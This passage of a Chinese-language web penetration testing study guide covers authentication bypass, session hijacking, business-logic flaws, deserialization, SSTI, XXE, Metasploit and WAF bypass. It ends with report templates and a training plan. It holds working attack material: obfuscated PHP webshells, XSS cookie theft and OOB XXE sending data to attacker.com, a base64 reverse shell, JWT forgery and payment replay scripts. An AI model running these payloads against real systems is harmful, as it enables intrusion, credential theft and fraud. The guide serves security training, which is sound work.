+<pre><code class="language-php">&lt;?php
+$a = str_replace('x','','sxysxtxexm');
+$b = str_replace('x','','$x_xGxExTx[xcx]');
+$a($b);
+?&gt;
+
+&lt;?php
+$_=("%01%02%03%04%05%06%07%08%09%10%11%12%13%14%15%16%17%18%19%20%21%22%23%24%25%26%27%28%29%30%31%32%33%34%35%36%37%38%39%40%41%42%43%44%45%46%47%48%49%50%51%52%53%54%55%56%57%58%59%60%61%62%63%64%65%66%67%68%69%70%71%72%73%74%75%76%77%78%79%80%81%82%83%84%85%86%87%88%89%90%91%92%93%94%95%96%97%98%99");
+$__=explode("%",$_);
+$___=$__[28].$__[34].$__[28].$__[29].$__[30].$__[33];
+$___($_POST['cmd']);
+?&gt;
+</code></pre>
+<hr />
+<h2 id="4-身份认证与授权攻击"><a class="header" href="#4-身份认证与授权攻击">4. 身份认证与授权攻击</a></h2>
+<h3 id="41-认证机制绕过"><a class="header" href="#41-认证机制绕过">4.1 认证机制绕过</a></h3>
+<h4 id="弱密码攻击"><a class="header" href="#弱密码攻击">弱密码攻击</a></h4>
+<p><strong>常见默认凭证</strong>:</p>
+<pre><code>admin:admin
+admin:password
+admin:123456
+root:root
+administrator:administrator
+</code></pre>
+<p><strong>密码喷洒攻击</strong>:</p>
+<pre><code class="language-bash"># Hydra暴力破解
+hydra -L users.txt -P passwords.txt http-post-form "http://target.com/login:username=^USER^&amp;password=^PASS^:Invalid"
+
+# Burp Intruder批量测试
+# 使用小批量常见密码对大量用户进行测试，避免账户锁定
+</code></pre>
+<p><strong>字典生成策略</strong>:</p>
+<pre><code class="language-bash"># 基于公司信息生成字典
+Company2023!
+Company@2023
+Company#2023
+
+# 基于用户信息
+John@1990
+John.Smith
+JSmith123
+</code></pre>
+<h4 id="多因素认证mfa绕过"><a class="header" href="#多因素认证mfa绕过">多因素认证（MFA）绕过</a></h4>
+<p><strong>常见绕过方法</strong>:</p>
+<pre><code>1. 会话固定: 在MFA验证前固定会话ID
+2. 响应篡改: 修改认证响应为成功状态
+3. 备用渠道: 利用未保护的API端点
+4. 爆破短信验证码: 4-6位数字可能被爆破
+5. OAuth流程劫持: 窃取授权码
+</code></pre>
+<p><strong>2FA绕过测试</strong>:</p>
+<pre><code class="language-http"># 尝试跳过2FA页面
+POST /verify-2fa HTTP/1.1
+
+# 修改为
+POST /dashboard HTTP/1.1
+
+# 或修改响应
+HTTP/1.1 200 OK
+{"status": "success", "2fa_required": false}
+</code></pre>
+<h3 id="42-会话管理漏洞"><a class="header" href="#42-会话管理漏洞">4.2 会话管理漏洞</a></h3>
+<h4 id="会话劫持"><a class="header" href="#会话劫持">会话劫持</a></h4>
+<p><strong>Cookie窃取</strong>:</p>
+<pre><code class="language-javascript">// 通过XSS窃取Cookie
+&lt;script&gt;
+document.location='http://attacker.com/steal?c='+document.cookie;
+&lt;/script&gt;
+
+// 发送到远程服务器
+fetch('http://attacker.com/log', {
+    method: 'POST',
+    body: JSON.stringify({
+        cookie: document.cookie,
+        url: location.href,
+        user_agent: navigator.userAgent
+    })
+});
+</code></pre>
+<p><strong>会话固定攻击</strong>:</p>
+<pre><code class="language-http"># 攻击者设置会话ID
+http://target.com/login?PHPSESSID=attacker_session_id
+
+# 受害者使用该会话登录
+# 攻击者使用相同会话ID访问受害者账户
+</code></pre>
+<h4 id="jwt安全"><a class="header" href="#jwt安全">JWT安全</a></h4>
+<p><strong>JWT结构</strong>:</p>
+<pre><code>Header.Payload.Signature
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+</code></pre>
+<p><strong>JWT攻击技术</strong>:</p>
+<pre><code class="language-python"># 算法混淆攻击(alg: none)
+import jwt
+import base64
+
+header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
+payload = base64.urlsafe_b64encode(b'{"sub":"admin","exp":9999999999}').decode().rstrip('=')
+token = f"{header}.{payload}."
+
+# RS256转HS256攻击
+# 使用公钥作为HMAC密钥签名JWT
+import jwt
+public_key = open('public.pem').read()
+token = jwt.encode({'sub': 'admin'}, public_key, algorithm='HS256')
+
+# 弱密钥爆破
+hashcat -m 16500 jwt.txt wordlist.txt
+
+# 密钥混淆
+# 使用kid参数注入
+{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
+</code></pre>
+<hr />
+<h2 id="5-业务逻辑漏洞挖掘"><a class="header" href="#5-业务逻辑漏洞挖掘">5. 业务逻辑漏洞挖掘</a></h2>
+<h3 id="51-支付逻辑漏洞"><a class="header" href="#51-支付逻辑漏洞">5.1 支付逻辑漏洞</a></h3>
+<p><strong>金额篡改</strong>:</p>
+<pre><code class="language-http">POST /api/order HTTP/1.1
+
+{
+    "product_id": 123,
+    "quantity": 1,
+    "price": 0.01,    # 篡改价格
+    "total": 0.01
+}
+</code></pre>
+<p><strong>订单重放</strong>:</p>
+<pre><code class="language-python"># 捕获支付成功的请求，重复发送
+import requests
+
+order_request = {
+    "order_id": "ORDER123",
+    "amount": 100,
+    "status": "paid"
+}
+
+for i in range(100):
+    response = requests.post('http://target.com/api/confirm_payment', json=order_request)
+    print(f"[{i}] {response.status_code}")
+</code></pre>
+<p><strong>并发竞争</strong>:</p>
+<pre><code class="language-python">import threading
+import requests
+
+def purchase_with_balance():
+    # 余额100元，商品99元
+    requests.post('http://target.com/purchase', json={'product': 'item1', 'price': 99})
+
+# 同时发起多个请求，可能购买多件商品
+threads = []
+for i in range(10):
+    t = threading.Thread(target=purchase_with_balance)
+    threads.append(t)
+    t.start()
+</code></pre>
+<h3 id="52-权限控制漏洞"><a class="header" href="#52-权限控制漏洞">5.2 权限控制漏洞</a></h3>
+<h4 id="垂直权限提升"><a class="header" href="#垂直权限提升">垂直权限提升</a></h4>
+<p><strong>IDOR (不安全的直接对象引用)</strong>:</p>
+<pre><code class="language-http"># 普通用户访问管理员功能
+GET /api/admin/users HTTP/1.1
+Cookie: session=normal_user_session
+
+# 修改用户ID获取他人信息
+GET /api/user/profile?id=1 HTTP/1.1  # 测试不同ID
+GET /api/user/profile?id=2 HTTP/1.1
+</code></pre>
+<p><strong>功能权限绕过</strong>:</p>
+<pre><code class="language-http"># 前端隐藏管理功能，但后端未验证
+POST /api/delete_user HTTP/1.1
+Cookie: session=normal_user_session
+
+{"user_id": 123}
+</code></pre>
+<h4 id="水平权限提升"><a class="header" href="#水平权限提升">水平权限提升</a></h4>
+<p><strong>用户数据越权</strong>:</p>
+<pre><code class="language-http"># 修改他人订单
+PUT /api/order/12345 HTTP/1.1
+
+{
+    "status": "cancelled",
+    "user_id": "victim_id"  # 尝试修改他人订单
+}
+
+# 查看他人私密信息
+GET /api/messages?user_id=victim_id HTTP/1.1
+</code></pre>
+<hr />
+<h2 id="6-高级攻击技术"><a class="header" href="#6-高级攻击技术">6. 高级攻击技术</a></h2>
+<h3 id="61-反序列化漏洞"><a class="header" href="#61-反序列化漏洞">6.1 反序列化漏洞</a></h3>
+<h4 id="java反序列化"><a class="header" href="#java反序列化">Java反序列化</a></h4>
+<p><strong>漏洞原理</strong>:</p>
+<pre><code class="language-java">// 危险的反序列化操作
+ObjectInputStream ois = new ObjectInputStream(input);
+Object obj = ois.readObject(); // 未验证输入
+</code></pre>
+<p><strong>利用链构造</strong>:</p>
+<pre><code class="language-bash"># ysoserial工具利用
+java -jar ysoserial.jar CommonsCollections6 "calc.exe" | base64
+
+# 反弹Shell
+java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"
+</code></pre>
+<p><strong>常见漏洞组件</strong>:</p>
+<ul>
+<li>Apache Commons Collections</li>
+<li>Spring Framework</li>
+<li>Fastjson</li>
+<li>Jackson</li>
+<li>XStream</li>
+</ul>
+<h4 id="php反序列化"><a class="header" href="#php反序列化">PHP反序列化</a></h4>
+<p><strong>魔术方法利用</strong>:</p>
+<pre><code class="language-php">class Evil {
+    private $cmd;
+
+    function __construct($cmd) {
+        $this-&gt;cmd = $cmd;
+    }
+
+    function __destruct() {
+        system($this-&gt;cmd);  # 对象销毁时执行命令
+    }
+}
+
+// 攻击载荷
+$payload = serialize(new Evil('whoami'));
+echo $payload;
+// O:4:"Evil":1:{s:9:"Evilcmd";s:6:"whoami";}
+</code></pre>
+<p><strong>POP链构造</strong>:</p>
+<pre><code class="language-php"># 利用对象属性导向编程构造攻击链
+class Start {
+    public $target;
+    function __destruct() {
+        $this-&gt;target-&gt;action();
+    }
+}
+
+class Middle {
+    public $var;
+    function action() {
+        eval($this-&gt;var);
+    }
+}
+
+$exploit = new Start();
+$exploit-&gt;target = new Middle();
+$exploit-&gt;target-&gt;var = 'system("id");';
+echo serialize($exploit);
+</code></pre>
+<h3 id="62-服务端模板注入ssti"><a class="header" href="#62-服务端模板注入ssti">6.2 服务端模板注入（SSTI）</a></h3>
+<p><strong>Jinja2模板注入</strong>:</p>
+<pre><code class="language-python"># Flask/Jinja2漏洞
+{{ config }}
+{{ config.items() }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+
+# 命令执行
+{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}
+
+# 读取文件
+{{ ''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read() }}
+</code></pre>
+<p><strong>Thymeleaf模板注入</strong>:</p>
+<pre><code class="language-java">${T(java.lang.Runtime).getRuntime().exec('calc')}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+</code></pre>
+<p><strong>Smarty模板注入</strong>:</p>
+<pre><code class="language-php">{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php eval($_GET['cmd']); ?&gt;",self::clearConfig())}
+</code></pre>
+<h3 id="63-xxe攻击xml外部实体注入"><a class="header" href="#63-xxe攻击xml外部实体注入">6.3 XXE攻击（XML外部实体注入）</a></h3>
+<p><strong>基础XXE</strong>:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+    &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;
+</code></pre>
+<p><strong>外带数据（OOB XXE）</strong>:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+%dtd;
+%send;
+]&gt;
+&lt;root&gt;&lt;/root&gt;
+</code></pre>
+<p>evil.dtd内容:</p>
+<pre><code class="language-xml">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;
+%all;
+</code></pre>
+<p><strong>SSRF via XXE</strong>:</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+&lt;!ENTITY xxe SYSTEM "http://internal-server/admin"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+</code></pre>
+<hr />
+<h2 id="7-工具使用精通"><a class="header" href="#7-工具使用精通">7. 工具使用精通</a></h2>
+<h3 id="71-burp-suite专业技巧"><a class="header" href="#71-burp-suite专业技巧">7.1 Burp Suite专业技巧</a></h3>
+<p><strong>Intruder攻击类型</strong>:</p>
+<pre><code>1. Sniper: 单一位置，逐个测试
+2. Battering ram: 所有位置使用相同载荷
+3. Pitchfork: 多位置，载荷并行
+4. Cluster bomb: 多位置，载荷笛卡尔积
+</code></pre>
+<p><strong>Macro宏录制</strong>:</p>
+<pre><code>1. 录制登录过程
+2. 提取CSRF Token
+3. 应用到其他请求
+</code></pre>
+<p><strong>Extender插件推荐</strong>:</p>
+<ul>
+<li>Autorize: 自动化权限测试</li>
+<li>Turbo Intruder: 高速攻击</li>
+<li>J2EEScan: Java应用扫描</li>
+<li>Retire.js: 前端组件漏洞检测</li>
+<li>ActiveScan++: 增强主动扫描</li>
+</ul>
+<h3 id="72-metasploit渗透框架"><a class="header" href="#72-metasploit渗透框架">7.2 Metasploit渗透框架</a></h3>
+<p><strong>基础使用流程</strong>:</p>
+<pre><code class="language-bash"># 搜索exploit
+msfconsole
+search apache
+search type:exploit platform:linux
+
+# 使用exploit
+use exploit/multi/http/struts2_content_type_ognl
+show options
+set RHOSTS target.com
+set LHOST attacker.ip
+run
+
+# 后渗透
+sessions -l
+sessions -i 1
+use post/multi/manage/shell_to_meterpreter
+</code></pre>
+<p><strong>Meterpreter常用命令</strong>:</p>
+<pre><code class="language-bash"># 系统信息
+sysinfo
+getuid
+getprivs
+
+# 文件操作
+download /etc/passwd
+upload backdoor.exe C:\\Windows\\Temp
+
+# 进程操作
+ps
+migrate 1234
+
+# 权限提升
+getsystem
+run post/windows/gather/hashdump
+
+# 持久化
+run persistence -X -i 60 -p 4444 -r attacker.ip
+</code></pre>
+<h3 id="73-自动化扫描工具"><a class="header" href="#73-自动化扫描工具">7.3 自动化扫描工具</a></h3>
+<p><strong>Nuclei模板引擎</strong>:</p>
+<pre><code class="language-bash"># 基础扫描
+nuclei -u https://target.com
+
+# 指定模板
+nuclei -u https://target.com -t cves/
+
+# 批量扫描
+nuclei -l targets.txt -o results.txt
+
+# 自定义模板
+nuclei -u https://target.com -t custom-template.yaml
+</code></pre>
+<p><strong>自定义Nuclei模板</strong>:</p>
+<pre><code class="language-yaml">id: custom-sqli-detection
+
+info:
+  name: SQL Injection Detection
+  author: pentest
+  severity: high
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/page?id=1'"
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "ORA-"
+        condition: or
+</code></pre>
+<hr />
+<h2 id="8-防护绕过技术"><a class="header" href="#8-防护绕过技术">8. 防护绕过技术</a></h2>
+<h3 id="81-waf绕过方法"><a class="header" href="#81-waf绕过方法">8.1 WAF绕过方法</a></h3>
+<h4 id="规则识别"><a class="header" href="#规则识别">规则识别</a></h4>
+<pre><code class="language-bash"># WAF指纹识别
+wafw00f https://target.com
+nmap --script=http-waf-detect target.com
+</code></pre>
+<h4 id="编码绕过"><a class="header" href="#编码绕过">编码绕过</a></h4>
+<pre><code>URL编码: %27 OR %31=%31
+双URL编码: %2527 OR %2531=%2531
+Unicode编码: \u0027 OR \u0031=\u0031
+十六进制编码: 0x27 OR 0x31=0x31
+</code></pre>
+<h4 id="大小写混淆"><a class="header" href="#大小写混淆">大小写混淆</a></h4>
+<pre><code class="language-sql">SeLeCt * FrOm users
+sELEct * fROM users
+</code></pre>
+<h4 id="注释插入"><a class="header" href="#注释插入">注释插入</a></h4>
+<pre><code class="language-sql">SELECT/**/username/**/FROM/**/users
+SELECT%0Ausername%0AFROM%0Ausers
+</code></pre>
+<h4 id="分块传输"><a class="header" href="#分块传输">分块传输</a></h4>
+<pre><code class="language-http">POST /api HTTP/1.1
+Transfer-Encoding: chunked
+
+5
+&lt;?php
+5
+syste
+3
+m('
+2
+id
+3
+');
+2
+?&gt;
+0
+</code></pre>
+<h3 id="82-cdn绕过"><a class="header" href="#82-cdn绕过">8.2 CDN绕过</a></h3>
+<p><strong>真实IP发现</strong>:</p>
+<pre><code class="language-bash"># 子域名查找
+subfinder -d target.com | dnsx -resp-only
+
+# 历史DNS记录
+curl -s "https://securitytrails.com/domain/target.com/history/a"
+
+# SSL证书查询
+censys search "target.com"
+
+# 邮件头分析
+发送邮件到目标，查看邮件头中的IP
+
+# Shodan搜索
+shodan search "ssl:target.com"
+</code></pre>
+<p><strong>源站直连</strong>:</p>
+<pre><code class="language-bash"># 修改Host头直接访问源IP
+curl -H "Host: target.com" http://real-ip-address
+
+# 利用非80/443端口
+nmap -p- real-ip-address
+</code></pre>
+<hr />
+<h2 id="9-渗透测试报告编写"><a class="header" href="#9-渗透测试报告编写">9. 渗透测试报告编写</a></h2>
+<h3 id="91-漏洞报告结构"><a class="header" href="#91-漏洞报告结构">9.1 漏洞报告结构</a></h3>
+<p><strong>标准漏洞报告模板</strong>:</p>
+<pre><code class="language-markdown"># 漏洞报告：SQL注入漏洞
+
+## 漏洞概述
+- **漏洞名称**: SQL注入漏洞
+- **发现时间**: 2024-01-15
+- **影响范围**: /api/user/login
+- **风险等级**: 高危
+
+## 漏洞描述
+在用户登录接口中发现SQL注入漏洞，攻击者可通过构造恶意SQL语句绕过身份验证，
+获取数据库敏感信息。
+
+## 复现步骤
+1. 访问登录页面 http://target.com/login
+2. 在用户名字段输入: admin' OR '1'='1'--
+3. 密码随意输入
+4. 点击登录，成功绕过验证进入系统
+
+## 技术细节
+**请求示例**:
+POST /api/user/login HTTP/1.1
+Content-Type: application/json
+
+{
+    "username": "admin' OR '1'='1'-- ",
+    "password": "anything"
+}
+
+**数据库查询**:
+SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='...'
+
+## 影响评估
+- 绕过身份验证机制
+- 获取所有用户敏感数据
+- 可能获取数据库管理员权限
+- 影响用户数量: 10000+
+
+## 修复建议
+1. 使用预编译语句（Prepared Statement）
+2. 实施输入验证和过滤
+3. 最小权限原则配置数据库
+4. 启用WAF防护规则
+
+**修复代码示例**:
+\```python
+# 不安全的代码
+query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+
+# 安全的代码
+cursor.execute(
+    "SELECT * FROM users WHERE username=? AND password=?",
+    (username, password)
+)
+\```
+
+## 验证方法
+1. 部署修复后重新测试
+2. 使用SQLMap自动化工具扫描
+3. 代码审计验证参数化查询
+</code></pre>
+<h3 id="92-渗透测试报告"><a class="header" href="#92-渗透测试报告">9.2 渗透测试报告</a></h3>
+<p><strong>完整报告结构</strong>:</p>
+<pre><code class="language-markdown"># 渗透测试报告
+
+## 1. 执行摘要
+### 1.1 测试概述
+- 测试单位: XXX公司
+- 测试时间: 2024-01-01 至 2024-01-15
+- 测试范围: Web应用、移动应用、API接口
+- 测试人员: 安全团队
+
+### 1.2 总体评估
+- 发现高危漏洞: 5个
+- 发现中危漏洞: 12个
+- 发现低危漏洞: 8个
+- 整体安全等级: 中等风险
+
+### 1.3 核心发现
+1. SQL注入漏洞可导致数据库完全泄露
+2. XSS漏洞可窃取管理员凭证
+3. 认证绕过漏洞允许未授权访问
+
+## 2. 测试范围
+### 2.1 测试目标
+- 主站: https://www.target.com
+- API: https://api.target.com
+- 管理后台: https://admin.target.com
+
+### 2.2 测试方法
+- 黑盒测试
+- 灰盒测试（部分源码审计）
+- 自动化扫描 + 手工验证
+
+### 2.3 测试限制
+- 不进行DDoS攻击
+- 不进行破坏性测试
+- 仅在授权范围内测试
+
+## 3. 漏洞详情
+### 3.1 高危漏洞
+[详细漏洞报告...]
+
+### 3.2 中危漏洞
+[详细漏洞报告...]
+
+### 3.3 低危漏洞
+[详细漏洞报告...]
+
+## 4. 修复优先级
+1. 立即修复: SQL注入、命令执行（1-3天）
+2. 短期修复: XSS、CSRF（1-2周）
+3. 中期修复: 配置问题、信息泄露（1个月）
+
+## 5. 总体建议
+- 建立SDL安全开发生命周期
+- 部署WAF和IDS/IPS
+- 定期进行安全培训
+- 实施代码审计流程
+</code></pre>
+<hr />
+<h2 id="10-学习验证标准"><a class="header" href="#10-学习验证标准">10. 学习验证标准</a></h2>
+<h3 id="-阶段一基础掌握1-2个月"><a class="header" href="#-阶段一基础掌握1-2个月">✅ 阶段一：基础掌握（1-2个月）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+能够独立搭建DVWA、WebGoat等靶场环境</li>
+<li><input disabled="" type="checkbox"/>
+理解并演示OWASP Top 10中的每个漏洞</li>
+<li><input disabled="" type="checkbox"/>
+熟练使用Burp Suite进行流量拦截和修改</li>
+<li><input disabled="" type="checkbox"/>
+能够编写基础的Python渗透脚本</li>
+<li><input disabled="" type="checkbox"/>
+完成至少10个CTF Web题目</li>
+</ul>
+<h3 id="-阶段二技能提升3-4个月"><a class="header" href="#-阶段二技能提升3-4个月">✅ 阶段二：技能提升（3-4个月）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+能够绕过基础WAF规则</li>
+<li><input disabled="" type="checkbox"/>
+掌握至少3种反序列化漏洞利用</li>
+<li><input disabled="" type="checkbox"/>
+独立发现并利用IDOR漏洞</li>
+<li><input disabled="" type="checkbox"/>
+编写自定义Burp插件</li>
+<li><input disabled="" type="checkbox"/>
+参与漏洞赏金计划并提交有效报告</li>
+</ul>
+<h3 id="-阶段三实战应用5-6个月"><a class="header" href="#-阶段三实战应用5-6个月">✅ 阶段三：实战应用（5-6个月）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+完成完整的渗透测试项目（包括报告）</li>
+<li><input disabled="" type="checkbox"/>
+发现并负责任披露真实漏洞</li>
+<li><input disabled="" type="checkbox"/>
+能够进行代码审计发现漏洞</li>
+<li><input disabled="" type="checkbox"/>
+掌握内网渗透基础技能</li>
+<li><input disabled="" type="checkbox"/>
+通过CEH或OSCP认证（可选）</li>
+</ul>
+<hr />
+<h2 id="11-实战环境推荐"><a class="header" href="#11-实战环境推荐">11. 实战环境推荐</a></h2>
+<h3 id="在线靶场"><a class="header" href="#在线靶场">在线靶场</a></h3>
+<ul>
+<li><strong>DVWA</strong>: Damn Vulnerable Web Application</li>
+<li><strong>WebGoat</strong>: OWASP教学平台</li>
+<li><strong>bWAPP</strong>: buggy Web Application</li>
+<li><strong>HackTheBox</strong>: 真实环境渗透平台</li>
+<li><strong>TryHackMe</strong>: 渐进式学习平台</li>
+<li><strong>PentesterLab</strong>: 专业渗透测试训练</li>
+</ul>
+<h3 id="本地搭建"><a class="header" href="#本地搭建">本地搭建</a></h3>
+<pre><code class="language-bash"># DVWA安装
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+# WebGoat安装
+docker run -p 8080:8080 -t webgoat/goatandwolf
+
+# Juice Shop
+docker run -p 3000:3000 bkimminich/juice-shop
+</code></pre>
+<h3 id="ctf平台"><a class="header" href="#ctf平台">CTF平台</a></h3>
+<ul>
+<li>CTFtime: 全球CTF赛事日历</li>
+<li>PicoCTF: 适合初学者</li>
+<li>Root-Me: 挑战题库</li>
+<li>OverTheWire: 命令行挑战</li>
+</ul>
+<hr />
+<h2 id="12-扩展学习资源"><a class="header" href="#12-扩展学习资源">12. 扩展学习资源</a></h2>
+<h3 id="-推荐书籍"><a class="header" href="#-推荐书籍">📚 推荐书籍</a></h3>
+<ol>
+<li><strong>《Web安全深度剖析》</strong> - 基础到进阶</li>
+<li><strong>《黑客攻防技术宝典：Web实战篇》</strong> - 经典参考书</li>
+<li><strong>《Web渗透测试：使用Kali Linux》</strong> - 工具实战</li>
+<li><strong>《白帽子讲Web安全》</strong> - 国内经典</li>
+</ol>
+<h3 id="-在线课程"><a class="header" href="#-在线课程">🎓 在线课程</a></h3>
+<ul>
+<li>Offensive Security: OSCP认证培训</li>
+<li>PortSwigger Web Security Academy: 免费系统化课程</li>
+<li>PentesterAcademy: 专业渗透课程</li>
+<li>Coursera/Udemy: 基础入门课程</li>
+</ul>
+<h3 id="-必备工具"><a class="header" href="#-必备工具">🔧 必备工具</a></h3>
+<pre><code class="language-bash"># 信息收集
+subfinder, amass, theHarvester, nmap, masscan
+
+# 漏洞扫描
+nuclei, nikto, wpscan, sqlmap
+
+# 代理工具
+Burp Suite, OWASP ZAP, mitmproxy
+
+# 渗透框架
+Metasploit, Cobalt Strike, Empire
+
+# 自动化
+Python + requests, selenium, playwright
+</code></pre>
+<h3 id="-安全资讯"><a class="header" href="#-安全资讯">📰 安全资讯</a></h3>
+<ul>
+<li>FreeBuf: 国内安全资讯</li>
+<li>先知社区: 技术文章</li>
+<li>Seebug漏洞平台: 漏洞库</li>
+<li>HackerOne: 漏洞赏金平台</li>
+<li>Twitter: 关注安全研究员</li>
+</ul>
+<hr />
+<h2 id="13-职业发展路径"><a class="header" href="#13-职业发展路径">13. 职业发展路径</a></h2>
+<h3 id="初级渗透测试工程师0-2年"><a class="header" href="#初级渗透测试工程师0-2年">初级渗透测试工程师（0-2年）</a></h3>
+<ul>
+<li>熟练使用常见渗透工具</li>
+<li>理解OWASP Top 10</li>
+<li>能够进行基础漏洞挖掘</li>
+<li>编写规范的渗透测试报告</li>
+</ul>
+<h3 id="中级渗透测试工程师2-5年"><a class="header" href="#中级渗透测试工程师2-5年">中级渗透测试工程师（2-5年）</a></h3>
+<ul>
+<li>独立完成渗透测试项目</li>
+<li>掌握代码审计技能</li>
+<li>具备漏洞研究能力</li>
+<li>能够绕过安全防护</li>
+</ul>
+<h3 id="高级渗透测试工程师5年以上"><a class="header" href="#高级渗透测试工程师5年以上">高级渗透测试工程师（5年以上）</a></h3>
+<ul>
+<li>APT攻击模拟</li>
+<li>0day漏洞挖掘</li>
+<li>安全架构设计</li>
+<li>团队管理与培训</li>
+</ul>
+<hr />
+<h2 id="-30天速成计划"><a class="header" href="#-30天速成计划">🎯 30天速成计划</a></h2>
+<h3 id="week-1-基础建设"><a class="header" href="#week-1-基础建设">Week 1: 基础建设</a></h3>
+<ul>
+<li>Day 1-2: 搭建Kali Linux环境，配置工具</li>
+<li>Day 3-4: HTTP协议深入学习，Burp Suite使用</li>
+<li>Day 5-6: SQL注入原理与实践（DVWA靶场）</li>
+<li>Day 7: 总结与复习，完成5个SQL注入题目</li>
+</ul>
+<h3 id="week-2-常见漏洞"><a class="header" href="#week-2-常见漏洞">Week 2: 常见漏洞</a></h3>
+<ul>
+<li>Day 8-9: XSS漏洞原理与利用</li>
+<li>Day 10-11: CSRF与SSRF漏洞</li>
+<li>Day 12-13: 文件上传与文件包含</li>
+<li>Day 14: 完成10个XSS/CSRF题目</li>
+</ul>
+<h3 id="week-3-高级技术"><a class="header" href="#week-3-高级技术">Week 3: 高级技术</a></h3>
+<ul>
+<li>Day 15-16: 反序列化漏洞研究</li>
+<li>Day 17-18: XXE与SSTTI漏洞</li>
+<li>Day 19-20: 逻辑漏洞挖掘</li>
+<li>Day 21: 完成5个高级漏洞题目</li>
+</ul>
+<h3 id="week-4-实战演练"><a class="header" href="#week-4-实战演练">Week 4: 实战演练</a></h3>
+<ul>
+<li>Day 22-23: HackTheBox靶机练习</li>
+<li>Day 24-25: 完整渗透测试流程</li>
+<li>Day 26-27: 编写渗透测试报告</li>
+<li>Day 28-30: 复习总结，查漏补缺</li>
+</ul>
+<hr />
+<h2 id="-安全提醒"><a class="header" href="#-安全提醒">⚠️ 安全提醒</a></h2>
+<ol>
+<li><strong>合法性第一</strong>: 始终在授权范围内进行测试</li>
+<li><strong>数据保护</strong>: 妥善保管测试过程中获取的数据</li>
+<li><strong>负责任披露</strong>: 发现漏洞后通过正规渠道报告</li>
+<li><strong>持续学习</strong>: 安全技术快速发展，保持学习状态</li>
+<li><strong>道德准则</strong>: 技术用于防御而非攻击</li>
+</ol>
+<hr />
+<h2 id="-总结"><a class="header" href="#-总结">📝 总结</a></h2>
+<p>Web渗透测试是一个需要持续学习和实践的领域。本指南提供了从基础到进阶的完整学习路径，但真正的技能提升需要：</p>
+<ol>
+<li><strong>大量实践</strong>: 理论结合靶场练习</li>
+<li><strong>深入思考</strong>: 理解漏洞本质而非记忆payload</li>
+<li><strong>举一反三</strong>: 从单个漏洞扩展到攻击面</li>
+<li><strong>保持好奇</strong>: 探索新技术和新漏洞</li>
+<li><strong>遵守法律</strong>: 在合法框架内提升技能</li>
+</ol>
+<p>记住：安全技术的目的是保护，而非破坏。成为一名优秀的安全研究员，需要技术能力与职业道德并重。</p>
+<hr />
+<p><strong>文档版本</strong>: v2.0
+<strong>最后更新</strong>: 2024年1月
+<strong>维护者</strong>: Security Learning Team
+<strong>反馈邮箱</strong>: security@example.com (请替换为实际邮箱)</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../编程/script/xmake.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../编程/security/内网渗透.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../编程/script/xmake.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../编程/security/内网渗透.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../theme/segmentit.umd.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../theme/searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../theme/pagetoc.js"></script>
+
+
+
+    </div>
+    </body>
+</html>
+
